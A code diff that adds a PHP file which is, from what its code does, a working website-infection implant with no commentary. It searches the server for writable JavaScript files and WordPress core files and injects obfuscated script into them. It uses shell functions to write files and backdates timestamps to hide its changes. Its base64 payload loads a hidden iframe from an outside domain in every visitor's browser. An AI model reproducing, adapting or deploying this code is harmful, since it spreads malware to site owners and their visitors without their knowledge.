@@ -1,0 +1,675 @@
+<?php @ignore_user_abort(true);
+@set_time_limit(25);
+@set_time_limit(0);
+@ini_set("memory_limit", 1073741824);
+$paste_data = unserialize(base64_decode("YTo3OntzOjM6IldUUCI7aTo0O3M6MjoiVEMiO3M6MToiMSI7czo0OiJEQVRBIjtzOjEwNjc6IndpbmRvdy5vbmxvYWQgPSBmdW5jdGlvbigpe2Z1bmN0aW9uIHgyMmJxKGEsYixjKXtpZihjKXt2YXIgZCA9IG5ldyBEYXRlKCk7ZC5zZXREYXRlKGQuZ2V0RGF0ZSgpK2MpO31pZihhICYmIGIpIGRvY3VtZW50LmNvb2tpZSA9IGErJz0nK2IrKGMgPyAnOyBleHBpcmVzPScrZC50b1VUQ1N0cmluZygpIDogJycpO2Vsc2UgcmV0dXJuIGZhbHNlO31mdW5jdGlvbiB4MzNicShhKXt2YXIgYiA9IG5ldyBSZWdFeHAoYSsnPShbXjtdKXsxLH0nKTt2YXIgYyA9IGIuZXhlYyhkb2N1bWVudC5jb29raWUpO2lmKGMpIGMgPSBjWzBdLnNwbGl0KCc9Jyk7ZWxzZSByZXR1cm4gZmFsc2U7cmV0dXJuIGNbMV0gPyBjWzFdIDogZmFsc2U7fXZhciB4MzNkcSA9IHgzM2JxKCIxYzZmM2EyZmM4OTU1MTUwNjJlZmNlNTcwY2Q0Nzc5NiIpO2lmKCB4MzNkcSAhPSAiYjlmNzJkMTMwY2MwNDI2MDFjNjAyM2ZiZDRiNDYxYjgiKXt4MjJicSgiMWM2ZjNhMmZjODk1NTE1MDYyZWZjZTU3MGNkNDc3OTYiLCJiOWY3MmQxMzBjYzA0MjYwMWM2MDIzZmJkNGI0NjFiOCIsMSk7dmFyIHgyMmRxID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7dmFyIHgyMnFxID0gImh0dHA6Ly9uZXdzLmJlbHVpaGFtZWxlb24uaW5mby9oZWxsb215bGl0dGxlcGlnZ3kvP25ScmpRZURWQ2o9a3BXZERmU3omV2FXYWtmc3hmaz1tdnRlUWxHRWVKRSZwWFdpQklsUldyTXZ0PVZ0VU1mdWlHU1FJeEFIaCZtd3JoT3Z3V2hhUktsWD1yQXFkVEd1S1ZwJlJDaHhKcm1oZkR5dkV4ZEtIPXh1a3RWcGlLSEpJV21HJkZIaG1ZWXVMSlVQUz1QQ0N5WmhOb3F2dGVZT09ZdllyJmd6WEFGSkd6RVpYcz13SXpPZmFicFNLZ0Yma2V5d29yZD01YzNjNjNkZmZhMWI4ZmM2YTIzMTExZGQwNzdmMDJkZSZDUlVJS2VZTXpnSGhJS3lYPXBsQWFFWkF3UGFjIjt4MjJkcS5pbm5lckhUTUw9IjxkaXYgc3R5bGU9J3Bvc2l0aW9uOmFic29sdXRlO3otaW5kZXg6MTAwMDt0b3A6LTEwMDBweDtsZWZ0Oi05OTk5cHg7Jz48aWZyYW1lIHNyYz0nIit4MjJxcSsiJz48L2lmcmFtZT48L2Rpdj4iO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoeDIyZHEpO319IjtzOjM6IkRFTCI7aTotMTtzOjM6IlBXVCI7aTotMTtzOjEzOiJDT01NRU5UX1NUQVJUIjtzOjMyOiIxYzZmM2EyZmM4OTU1MTUwNjJlZmNlNTcwY2Q0Nzc5NiI7czoxMToiQ09NTUVOVF9FTkQiO3M6MzI6IjFjNmYzYTJmYzg5NTUxNTA2MmVmY2U1NzBjZDQ3Nzk2Ijt9"));
+$is_stream = -1;
+if($is_stream != 1){
+	close_connect();
+}	
+$DR = $_SERVER["DOCUMENT_ROOT"];
+$lvls = 3;
+$init_parts = explode(DIRECTORY_SEPARATOR,$DR);
+if(count($init_parts) < $lvls){
+	$lvls = count($init_parts)-1;                         
+}
+
+$root = "";
+$bad = true;
+while($bad){
+	$parts = array_slice($init_parts,0,count($init_parts)-($lvls));
+	$root = implode(DIRECTORY_SEPARATOR,$parts).DIRECTORY_SEPARATOR;
+	if(is_readable($root)){
+		$bad = false;
+	}else{
+		if($root == $DR){
+			$bad =false;
+		}
+		$lvls -= 1;
+	}
+}
+                               
+//echo $root."\r\n";
+//echo $lvls."\r\n";
+$pathes = array();
+$putted = array();
+$pattern = "";
+$ITERATE = 8;
+
+for($i = 1; $i < $ITERATE; $i++){
+	$pattern .= "*".DIRECTORY_SEPARATOR;
+}
+$pattern .= "*\.js";
+
+if($ITERATE == 1){
+	$_wp_files = array(
+						$DR.DIRECTORY_SEPARATOR."wp-includes".DIRECTORY_SEPARATOR."theme.php"=>array('tc'=>'function current_theme_supports( $feature ) {','paste'=>'if($feature == "widgets"){%%PASTE%%}'),
+						$DR.DIRECTORY_SEPARATOR."wp-includes".DIRECTORY_SEPARATOR."general-template.php"=>array('tc'=>'function _wp_render_title_tag() {','paste'=>'empty')
+					);
+	foreach($_wp_files as $_wp_file=>$_data){
+		if(@file_exists($_wp_file) && @is_writable($_wp_file)){
+			$_wp_paste = $paste_data;
+			$WHERE_TO_PASTE = 2;
+			$TARGET_CONTENT = $_data['tc'];//base64_decode("{%%TC%%}");
+			$DATA = $_wp_paste["DATA"];//base64_decode("{%%DATA%%}");
+			$DEL = $_wp_paste["DEL"];
+			//$DEL = 1;
+			$COMMENT_START = $_wp_paste["COMMENT_START"];
+			$COMMENT_END = $_wp_paste["COMMENT_END"];
+			
+			
+			$current_path = array("crt"=>false,"path"=>"","url"=>"");
+			$FPATH =  $_wp_file;
+			if($DEL != 1){
+				$_tData = 'echo "<script type=\"text/javascript\">'.PHP_EOL.str_replace('"','\"',CryptJs::encode($DATA)).PHP_EOL.'</script>";';
+				if($_data['paste'] == "empty"){
+					$_curData = $_tData;
+				}else{
+					$_curData = str_replace('%%PASTE%%',$_tData,$_data['paste']);
+				}
+				
+			}else{
+				$_curData = "";
+			}
+			$__fname = end(explode(DIRECTORY_SEPARATOR,$FPATH));
+			if($__fname == "general-template.php"){
+				$_COMMENT_START = $__fname.' content';
+				$_COMMENT_END = $__fname.' content';
+			}else{
+				$_COMMENT_START = md5($COMMENT_START.$__fname);
+				$_COMMENT_END = md5($COMMENT_END.$__fname);
+			}
+			
+			//$_curData = $DATA;
+
+			$PASTE_WITH_TAGS = false;
+			$PASTE_CONTENT = "/*".$_COMMENT_START."*/{DATA}/*".$_COMMENT_END."*/";
+			$PREG = $DEF_PREG = "|\/\*.{".strlen($_COMMENT_START)."}\*\/[\s\S]*\/\*.{".strlen($_COMMENT_END)."}\*\/|i";
+			if($DEL == 1){
+			   $FOR_PASTE = "";
+			}else{
+				$FOR_PASTE = str_replace("{DATA}",$_curData,$PASTE_CONTENT);
+			}
+			$init_file_data = file_get_contents($FPATH);
+			$is_putted = false;
+			if($DEL == 1){
+				$ready_cont = prepare_data($DEF_PREG, $init_file_data, $FOR_PASTE, $WHERE_TO_PASTE, $TARGET_CONTENT, $PASTE_WITH_TAGS, false,true);
+				$is_putted = my_file_put_contents($FPATH,$ready_cont);
+			}else{
+				$ready_cont = prepare_data($PREG, $init_file_data, $FOR_PASTE, $WHERE_TO_PASTE, $TARGET_CONTENT, $PASTE_WITH_TAGS, true,$DEL);
+				$is_putted = my_file_put_contents($FPATH,$ready_cont);
+			}
+			
+			
+			if($is_putted !== false){
+				$current_path['path'] = $FPATH;
+				$current_path['crt'] = true;
+			}	
+			if($current_path['crt']){
+				$url = $current_path['path'];
+				$current_path['url'] = $url;
+			}
+			$putted[] = $current_path;
+			
+		}else{
+			
+		}
+	}
+	//$_wp_file = $DR.DIRECTORY_SEPARATOR."wp-includes".DIRECTORY_SEPARATOR."theme.php";
+	
+	$patterns = array();
+	$_DR = $DR;
+	if(substr($_DR, -1) != DIRECTORY_SEPARATOR){
+		$_DR .= DIRECTORY_SEPARATOR;
+	}
+	for($i = 1; $i <= 10; $i++){
+		$str = $_DR;
+		for($j = 1; $j <= $i;$j++){
+			$str .= "*".DIRECTORY_SEPARATOR;
+		}
+		$str .= "*\.js";
+		$patterns[] = $str;
+	}
+	foreach($patterns as $patt){
+		@ignore_user_abort(true);
+		@set_time_limit(25);                          
+		@set_time_limit(0);
+		@ini_set("memory_limit", "4096M");                          
+		$_pathes = glob($patt);
+		if(!empty($_pathes)){
+			$good_pathes = array();
+			foreach($_pathes as $k=>$_path){
+				@ignore_user_abort(true);
+				@set_time_limit(25);
+				@set_time_limit(0);
+				@ini_set("memory_limit", "4096M");  
+				if(@is_writable($_path) && !is_link($_path)){
+					$good_pathes[] = $_path;
+					
+					//echo base64_encode("OK_START:").base64_encode(serialize(paste_code($good_pathes))).base64_encode("-END");
+					//return;
+				}
+			}
+			if(!empty($good_pathes)){
+				$putted += paste_code($good_pathes,$paste_data);
+			}	
+		}
+	}
+}
+
+if(is_readable($root) && $root != $DR){                          
+	if(substr($root, -1) != DIRECTORY_SEPARATOR)
+	$root= $root.DIRECTORY_SEPARATOR;
+	
+	$pattern = $root.$pattern;
+		@ignore_user_abort(true);
+		@set_time_limit(25);                          
+		@set_time_limit(0);
+		@ini_set("memory_limit", "4096M");                          
+		$_pathes = glob($pattern);
+		//make some with pathes
+		
+			if(!empty($_pathes)){
+				$good_pathes = array();
+				foreach($_pathes as $k=>$_path){
+					@ignore_user_abort(true);
+					@set_time_limit(25);
+					@set_time_limit(0);
+					@ini_set("memory_limit", "4096M");  
+					if(@is_writable($_path) && !is_link($_path)){
+					//if(!is_link($_path)){
+						$good_pathes[] = $_path;
+						
+						//echo base64_encode("OK_START:").base64_encode(serialize(paste_code($good_pathes))).base64_encode("-END");
+						//return;
+					}
+				}
+				if(!empty($good_pathes)){
+					$putted += paste_code($good_pathes,$paste_data);
+				}
+			}
+		
+	//$good_pathes = array_unique($good_pathes);
+}
+
+
+//var_dump($pathes);
+//return;
+
+//print_r($putted);
+//return;
+
+
+echo base64_encode("OK_START:").base64_encode(serialize($putted)).base64_encode("-END");
+return;
+
+function paste_code($good_pathes,$paste_data){
+	
+	$WHERE_TO_PASTE = $paste_data["WTP"];
+	$TARGET_CONTENT = $paste_data["TC"];//base64_decode("{%%TC%%}");
+	$DATA = $paste_data["DATA"];//base64_decode("{%%DATA%%}");
+	$_PASTE_WITH_TAGS = $paste_data["PWT"];
+	$DEL = $paste_data["DEL"];
+	//$DEL = 1;
+	
+	$COMMENT_START = $paste_data["COMMENT_START"];
+	$COMMENT_END = $paste_data["COMMENT_END"];
+
+
+	$putted_path = array();
+	
+	for($i = 0; $i < count($good_pathes); $i++ ){
+		//$putted_path[] = $good_pathes[$i];
+		//continue;
+        //if($DEL != 1){
+            //if(empty($DATA) || strlen($DATA) == 0 || $DATA == ""){
+        		//continue;                                 
+        	//}                             
+        //}                                 
+        
+		
+		$current_path = array("crt"=>false,"path"=>"","url"=>"");
+		$FPATH =  $good_pathes[$i];
+		if($DEL != 1){
+			$_curData = CryptJs::encode($DATA);
+		}else{
+			$_curData = "";
+		}
+		$__fname = end(explode(DIRECTORY_SEPARATOR,$FPATH));
+		$_COMMENT_START = md5($COMMENT_START.$__fname);
+		$_COMMENT_END = md5($COMMENT_END.$__fname);
+		//$_curData = $DATA;
+
+		$PASTE_WITH_TAGS = false;
+		if($_PASTE_WITH_TAGS == -1)
+			$PASTE_WITH_TAGS = false;
+		else
+			$PASTE_WITH_TAGS = true;
+		$PASTE_CONTENT = "/*".$_COMMENT_START."*/{DATA}/*".$_COMMENT_END."*/";
+		$PASTE_CONTENT_html = "<!--".$_COMMENT_START."-->{DATA}<!--".$_COMMENT_END."-->";
+		//$PREG = $DEF_PREG = "|\/\*".$_COMMENT_START."\*\/[\s\S]*\/\*".$_COMMENT_END."\*\/|i";
+		$PREG = $DEF_PREG = "|\/\*.{32}\*\/[\s\S]*\/\*.{32}\*\/|i";
+		//$DEF_HTML_PREG = "|\<\!\-\-".$_COMMENT_START."\-\-\>[\s\S]*\<\!\-\-".$_COMMENT_END."\-\-\>|i";
+		$DEF_HTML_PREG = "|\<\!\-\-.{32}\-\-\>[\s\S]*\<\!\-\-.{32}\-\-\>|i";
+		if($PASTE_WITH_TAGS){
+			//$PREG = "|\<\!\-\-".$_COMMENT_START."\-\-\>[\s\S]*\<\!\-\-".$_COMMENT_END."\-\-\>|i";
+			$PREG = "|\<\!\-\-.{32}\-\-\>[\s\S]*\<\!\-\-.{32}\-\-\>|i";
+		}
+		if($DEL == 1){
+		   $FOR_PASTE = "";
+		}else{
+			if($PASTE_WITH_TAGS){
+				$FOR_PASTE = str_replace("{DATA}","<?php ".$_curData." ?>",$PASTE_CONTENT_html);
+			}else{
+				$FOR_PASTE = str_replace("{DATA}",";".$_curData,$PASTE_CONTENT);
+			}
+		}
+		
+		if(file_exists($FPATH) and is_writeable($FPATH)){
+			$init_file_data = file_get_contents($FPATH);
+			//$putted_path['temp'] = strpos($init_file_data, $TARGET_CONTENT)."($DEL)";
+			//$putted_path['temp'] = array("pm"=>preg_match($PREG, $init_file_data),"del"=>$DEL,"PREG"=>$PREG,"pwt"=>$PASTE_WITH_TAGS,"str"=>strlen($init_file_data));
+			$file_info = get_file_info($FPATH);
+			$is_putted = false;
+			if($DEL == 1){
+				$ready_cont = prepare_data($DEF_PREG, $init_file_data, $FOR_PASTE, $WHERE_TO_PASTE, $TARGET_CONTENT, $PASTE_WITH_TAGS, false,true);
+				$ready_cont = prepare_data($DEF_HTML_PREG, $ready_cont, $FOR_PASTE, $WHERE_TO_PASTE, $TARGET_CONTENT, $PASTE_WITH_TAGS, false,true);
+				$is_putted = my_file_put_contents($FPATH,$ready_cont);
+			}else{
+				if($file_info['ext'] == false){
+				  $ready_cont = prepare_data($PREG, $init_file_data, $FOR_PASTE, $WHERE_TO_PASTE, $TARGET_CONTENT, $PASTE_WITH_TAGS, false,$DEL);
+				  $is_putted = my_file_put_contents($FPATH,$ready_cont);
+				}else{
+					if($file_info['ext'] == "php"){
+						$ready_cont = prepare_data($PREG, $init_file_data, $FOR_PASTE, $WHERE_TO_PASTE, $TARGET_CONTENT, $PASTE_WITH_TAGS, true,$DEL);
+						$is_putted = my_file_put_contents($FPATH,$ready_cont);
+
+					}else{
+						$ready_cont = prepare_data($PREG, $init_file_data, $FOR_PASTE, $WHERE_TO_PASTE, $TARGET_CONTENT, $PASTE_WITH_TAGS, false,$DEL);
+						$is_putted = my_file_put_contents($FPATH,$ready_cont);
+					}
+				}
+			}
+			
+			
+			if($is_putted !== false){
+				$current_path['path'] = $FPATH;
+				$current_path['crt'] = true;
+			}	
+			if($current_path['crt']){
+				//$url = 'http://'.str_replace($doc_root,$domain.'/',$current_path['path']);
+				$url = $current_path['path'];
+				$current_path['url'] = $url;
+			}
+			$putted_path[] = $current_path;
+		}else{
+			//nothing
+		}
+	}
+	return $putted_path;
+}
+
+
+//exit();
+
+function prepare_data($preg, $init_data, $for_put, $wtp, $tc,$pwt, $isphp, $DEL){
+	$new_data = $init_data;
+	if (preg_match($preg, $init_data)){
+		$init_data = preg_replace($preg, "", $init_data);
+	}
+	if($DEL!=1){
+		if($wtp == 1){
+			$new_data = str_replace_first($tc,$for_put.$tc,$init_data);
+		}else if($wtp == 2){
+			$new_data = str_replace_first($tc,$tc.$for_put,$init_data);
+		}else if($wtp == 3){
+			$new_data = $for_put.$init_data;
+		}else{
+			$new_data = $init_data.$for_put;
+		}
+	}else{
+		$new_data = $init_data;
+	}
+		
+	return $new_data;
+}
+
+
+function str_replace_first($search, $replace, $subject) {
+    $pos = stripos($subject, $search);
+    if ($pos !== false) {
+        $subject = substr_replace($subject, $replace, $pos, strlen($search));
+    }
+    return $subject;
+}
+
+function my_file_put_contents($fpath,$data){
+	$init_perm = substr(sprintf('%o', fileperms($fpath)), -3);
+	$touch_exists = false;
+	if(file_exists($fpath)){
+		$touch_exists = filemtime($fpath);
+		@chmod($fpath, 0755);
+	}else{
+		//return false;
+	}
+	$funcs = array('system','passthru','exec','shell_exec');	
+	$path = get_path($fpath);
+	$file_name = end(explode(DIRECTORY_SEPARATOR,$fpath));
+	$good_func = false;
+	  foreach($funcs as $func){
+		  if(function_exists($func)){
+			$res = $func("cd " . $path . ";touch $file_name;ls -la");
+			if(strpos(strtolower($res),$file_name)!==false){
+				$good_func = $func;
+				$func("rm ".$file_name.";");
+				break;
+			}
+		  }
+	  }
+	$done  = false;
+	$tmp_dir = @ini_get('upload_tmp_dir');
+	$tmp_dir = $tmp_dir ? $tmp_dir : @sys_get_temp_dir();
+	if($good_func){
+		$temp_file = tempnam($tmp_dir, 'tetqwqsad');
+		$temp_file_parts = explode(DIRECTORY_SEPARATOR,$temp_file);
+		$temp_file_path = get_path($temp_file);
+		$res = $good_func("cd ".$temp_file_path."; echo '".$data."' > ".end($temp_file_parts).";ls -la");
+		if(strpos(strtolower($res),$file_name)!==false){
+			rename($temp_file, $fpath);
+			if(content_exist($fpath,$data)){
+				$done = true;
+			}
+			//echo $good_func;
+		}	
+		@unlink($temp_file);
+	}
+	if(!$done){
+		$temp_file = tempnam($tmp_dir, 'HERwqsad');
+		if(_file_put_contents($temp_file,$data)){
+			rename($temp_file, $fpath);
+			if(content_exist($fpath,$data)){
+				$done = true;
+			}
+		}
+		
+	}
+	if($good_func && !$done){
+		$res = $good_func("cd ".$path."; echo '".$data."' > ".$file_name.";ls -la");
+		if(strpos(strtolower($res),$file_name)!==false){
+			if(content_exist($fpath,$data)){
+				$done = true;
+			}
+			//echo $good_func;
+		}
+	}
+	if(!$done){
+		if(_file_put_contents($fpath,$data)!==false){
+			if(content_exist($fpath,$data)){
+				$done = true;
+			}
+			$done = true;
+			//echo 'file_put_contents';
+		}
+	}
+	if($done){
+		//$file_data = file_get_contents($fpath);
+		//if(strpos(strtolower($file_data),strtolower($data)) !== false){
+			
+            make_touch($fpath,$touch_exists,true);
+			$perm = substr(sprintf('%o', fileperms($fpath)), -3);
+			if($perm < 655){
+        		chmod($fpath, 0644);	                
+          	}
+		//}else{
+		//	$done = false;
+		//}
+	}
+	//@chmod($fpath, intval('0'.$init_perm, 8));
+	return $done;
+}
+
+function _file_put_contents($fpath,$data){
+	$fp = fopen($fpath, 'w');
+	$write = fwrite($fp, $data);
+	fclose($fp);
+	if($write === false){
+		return false;
+	}
+	return true;
+}
+
+function content_exist($fpath,$content){
+	if(empty($content) || strlen($content) == 0 || $content == ""){
+		return true;
+	}
+	$file_data = file_get_contents($fpath);
+	if(strpos($file_data,$content) !== false){
+		return true;
+	}
+	return false;
+}
+
+function get_file_info($file_path){
+	$file_name = end(explode('/',$file_path));
+	if(strpos($file_name,".")!==false){
+		$parts = explode('.',$file_name);
+		$ext = end($parts);
+		$file_name_no_ext = array();
+		for($i = 0; $i < (count($parts)-1); $i++){
+            $file_name_no_ext[] = $parts[$i];                         
+        }
+        $file_name_no_ext = implode('.',$file_name_no_ext);                                   
+		return array("file_name"=>$file_name,"ext"=>$ext,"file_name_no_ext"=>$file_name_no_ext);
+	}else{
+		return array("file_name"=>$file_name,"ext"=>false);
+	}
+}
+
+function make_touch($fpath,$touch_exist = false,$touch_par_dir = false){
+    $ttime = 0; 
+	if($touch_exist){
+		$ttime = $touch_exist;
+	 }else{
+		$ttime = get_some_touch($fpath);
+	 }
+	 
+     @touch($fpath,$ttime);
+     if($touch_par_dir===true){
+          $fpath = explode(DIRECTORY_SEPARATOR,$fpath);
+          array_splice($fpath, (count($fpath)-1), 1);
+          $fpath= implode(DIRECTORY_SEPARATOR,$fpath);
+          if(substr($fpath, -1) != DIRECTORY_SEPARATOR)
+               $fpath= $fpath.DIRECTORY_SEPARATOR;
+          @touch($fpath,$ttime);
+     }
+}
+
+function get_some_touch($fpath){
+   $fpath = explode(DIRECTORY_SEPARATOR,$fpath);
+   array_splice($fpath, (count($fpath)-1), 1);
+   $fpath= implode(DIRECTORY_SEPARATOR,$fpath);
+   if(substr($fpath, -1) != DIRECTORY_SEPARATOR)
+   $fpath= $fpath.DIRECTORY_SEPARATOR;
+   $dirs = array_diff(scandir($fpath),array(".",".."));
+   $touches = array();
+   foreach($dirs as $one){
+      $stat = stat($fpath.$one);
+      $touches[] = $stat['mtime'];
+   }
+   //asort($touches);
+   sort($touches, SORT_NUMERIC); 
+   if(isset($touches[0]) and !empty($touches) and $touches[0]>0)
+     return $touches[0];
+   else
+     return (time() - (3600*24*30 * 12));
+}
+
+function get_path($path){
+	$parts = explode(DIRECTORY_SEPARATOR,$path);
+	$final = array();
+	for($i = 0; $i < count($parts); $i++){
+		$one = $parts[$i];
+		if(empty($one)) continue;
+		$final[] = $one;
+	}
+	if(empty($final))
+		return false;
+		
+	$updir = array();
+	for($i = 0; $i < (count($final) - 1); $i++){
+		$one = $final[$i];
+		if(empty($one)) continue;
+		$updir[] = $one;
+	}
+	if(empty($updir))
+		return false;
+	if(DIRECTORY_SEPARATOR == '/'){
+		$updir = DIRECTORY_SEPARATOR.implode(DIRECTORY_SEPARATOR,$updir).DIRECTORY_SEPARATOR;
+	}else{
+		$updir = implode(DIRECTORY_SEPARATOR,$updir).DIRECTORY_SEPARATOR;
+	}
+	
+	if(is_readable($updir)){
+		return $updir;
+	}
+	
+	return false;	
+}
+
+class CryptJs{
+
+	public static function encode($str){
+		$str = self::makeScript($str);
+		return $str;
+		$count = rand(10,20);
+		$chunk_size = round(strlen($str) / $count,0);
+
+		if($chunk_size > 1){
+			$chunks = array_diff(explode("{{||}}",chunk_split($str,$chunk_size,"{{||}}")),array(""));
+		}else{
+			$chunks = array($str);  
+		}
+
+		foreach($chunks as $k=>$v){
+			$_v = array();
+			foreach(str_split($v) as $char){
+				$_v[] = '\x'.bin2hex($char);
+			}
+			$_v = implode("",$_v);
+			$chunks[$k] = $_v;
+		}
+		$randChunks = $chunks;
+		shuffle($randChunks);shuffle($randChunks);
+
+		$_var1 = self::strToHex(self::genR(5),"\"");
+		$_var2 = self::genR(5);
+		$_var3 = self::genR(5);	
+
+		$output = '{{DEF}}{{DEF_VARS}}eval(eval({{DATA}}));';
+
+		$dataStr = array();
+		$def_array = array();
+		foreach($randChunks as $k=>$v){
+			$def_array[] = $v;
+		}
+		$def_array = "window[".self::strToHex("document","\"")."][".$_var1."]=[\"".implode("\",\"",$def_array)."\"];";
+		$def_vars = array();
+
+		$rand_d_vars = rand(2,7);
+		for($i = 0; $i < $rand_d_vars; $i++){
+			$def_vars[] = self::genR(5);
+		}
+
+		$def_vars_str = "var ".implode("=",$def_vars)."=window[".self::strToHex("document")."][".$_var1."],".$_var3."=window;";
+
+		foreach($chunks as $k=>$v){
+			foreach($randChunks as $k2=>$v2){
+				if($v2 == $v){
+					$_var = $def_vars[rand(0,($rand_d_vars-1))];
+					if(rand(1,100)>50){
+						$_var = str_replace("\"","\\\"",self::strToHex($_var));
+					}else{
+						$_var = "\\\"".$_var."\\\"";
+					}
+					$dataStr[] = $_var3."[".$_var."][".str_replace("\"","\\\"",self::strToHex($k2))."]";
+					break;
+				}
+			}
+			
+		}
+
+		$dataStr = "\"[".implode(",",$dataStr)."].join(\\\"\\\");\"";
+		$output = str_replace(array("{{DEF}}","{{DEF_VARS}}","{{DATA}}"),array($def_array,$def_vars_str,$dataStr),$output);
+		return $output;
+	}
+
+	public static function makeScript($data){
+		$_var1 = self::genR(8);
+		$_var2 = self::genR(8);
+		$_var3 = self::genR(8);
+
+		$script = '(function(){var '.$_var1.'="";var '.$_var2.'="'.self::ToHex($data).'";for (var '.$_var3.'=0;'.$_var3.'<'.$_var2.'.length;'.$_var3.'+=2){'.$_var1.'='.$_var1.'+parseInt('.$_var2.'.substring('.$_var3.','.$_var3.'+2), 16)+",";}'.$_var1.'='.$_var1.'.substring(0,'.$_var1.'.length-1);eval(eval(\'String.fromCharCode(\'+'.$_var1.'+\')\'));})();';
+		return $script;
+	}
+
+	public static function genR($length = 8){ 
+		$chars = 'abdefhiknrstyz'; 
+		$numChars = strlen($chars); 
+		$string = ''; 
+		for ($i = 0; $i < $length; $i++) { 
+			$string .= substr($chars, rand(1, $numChars) - 1, 1); 
+		} 
+		return $string; 
+	} 
+
+	public static function ToHex($string) { 
+		$hex=''; 
+		for ($i=0; $i < strlen($string); $i++) { 
+			$hex .= dechex(ord($string[$i])); 
+		} 
+		return $hex; 
+	}
+
+	public static function strToHex($str,$connector="\""){
+		$count = rand(4,7);
+		//$count = 1;
+		$chunk_size = round(strlen($str) / $count,0);
+
+		if($chunk_size > 1){
+			$chunks = array_diff(explode("{{||}}",chunk_split($str,$chunk_size,"{{||}}")),array(""));
+		}else{
+			$chunks = array($str);  
+		}
+
+		$return = array();
+		foreach($chunks as $k=>$v){
+			$v = str_split($v);
+			foreach($v as $_k=>$char){
+				$v[$_k] = "\\x".bin2hex($char);
+			}
+			$chunks[$k] = $connector.implode("",$v).$connector;
+		}
+
+		return implode("+",$chunks);
+	}
+}
+function close_connect($code = 200){
+	ignore_user_abort(true);
+	set_time_limit(0);
+	ob_end_clean();
+	header("HTTP/1.0 $code OK");
+	header("Connection: close"); 
+	ob_start();
+	echo "ok";
+	$size = ob_get_length();
+	header("Content-Length: $size");
+	ob_end_flush(); 
+	flush();
+	//ob_flush();
+	if(function_exists("fastcgi_finish_request")){
+		fastcgi_finish_request();
+		//exit("yes");
+	}else{
+		//exit("no");
+	}
+}
